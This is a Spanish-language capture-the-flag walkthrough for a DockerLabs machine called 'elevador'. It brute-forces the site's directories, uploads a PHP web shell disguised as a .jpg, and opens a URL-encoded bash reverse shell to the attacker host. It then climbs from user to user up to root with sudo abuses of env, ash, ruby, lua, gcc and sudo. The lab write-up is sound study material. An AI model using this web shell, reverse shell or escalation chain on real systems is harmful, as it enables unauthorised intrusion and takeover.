nmap:  80
![image](https://github.com/user-attachments/assets/206a9c1a-9a66-4136-b0f9-050aa3a76ad0)


---
dentro de la pagina podemos ver que nos da un mensaje al abrir el ascensor:
![[dockerlabs/facil/elevador/pagina principal.png]]
![[dockerlabs/facil/elevador/pagina principal 2.png]]
al hacer una ataque de fuerza bruta a los directorios  nos mostrara un "themes",

      gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,txt -k

![[dockerlabs/facil/elevador/gobuster.png]]

ahora si hacemos otra vez un gobuster pero agregando el "themes" 

      gobuster dir -u http://172.17.0.2/themes -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,txt -k


y nos dará algunos importantes
![[gobuster2.png]]

si ingresamos al primero o sea al uploads nos mandara a una subida de archivos
![[uploads.png]]

como también me dio: archivo.html nos vamos ahí y vemos que podemos subir archivos pero solo archivos JPG
![[pagina principal3.png]]


como solo deja subir archivos "jpg" modificamos un archivo 
> nano shell.php.jpg

dentro tendrá este código:

    - <?php system($_GET['cmd']); ?>

vemos que se subió
![[dockerlabs/facil/elevador/subido.png]]

 presionamos el archivo que nos muestra y veremos que no hay nada pero en la URL la modificamos para que quede así:
> 172.17.0.2/themes/uploads/675712b70a259.jpg?cmd=whoami
![[comprobando.png]]

nos mostrara "www-data" o sea que la vulnerabilidad esta, así que modificamos la terminal con una bash y colocamos el terminal en escucha
dejamos la terminal asi:

> 172.17.0.2/themes/uploads/675712b70a259.jpg?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/443%200%3E%261%22

![[conexion.png]]

y ahora dentro si hacemos un "sudo -l" vemos que podemos escalar por "env", 
![[env.png]]
la buscamos: https://gtfobins.github.io/gtfobins/env/

como se que hay otros usuarios pobre y funciono el escalado con daphne:
> sudo -u daphne /usr/bin/env /bin/sh
![[usuario1.png]]

y somos el usuario daphne

al hacer sudo -l da: "ash" la buscamos: https://gtfobins.github.io/gtfobins/ash/

ahora lanzamos asi:
> sudo -u vilma /usr/bin/ash
![[dockerlabs/facil/elevador/usuario2.png]]

y somos vilma

ahora al hacer sudo -l da que es ruby buscamos donde mismo y lanzamos asi:
> sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
![[dockerlabs/facil/elevador/usuario3.png]]

ahora somos shaggy y entonces ahora buscamos como escalar y aparece "lua"

lanzamos el comando así:
> sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'

![[usuario4.png]]

somos fred

podemos escalar con gcc y donde mismo buscamos y lanzamos el comando:
> sudo -u scooby /usr/bin/gcc  -wrapper /bin/sh,-s .

![[usuario5.png]]

somos scooby

ahora al hacer sudo -l podemos  ver que se escala por "sudo", modifico  el codigo para que se vea de esta forma:
> sudo -u root /usr/bin/sudo /bin/bash

![[dockerlabs/facil/elevador/root.png]]

y somos root! 
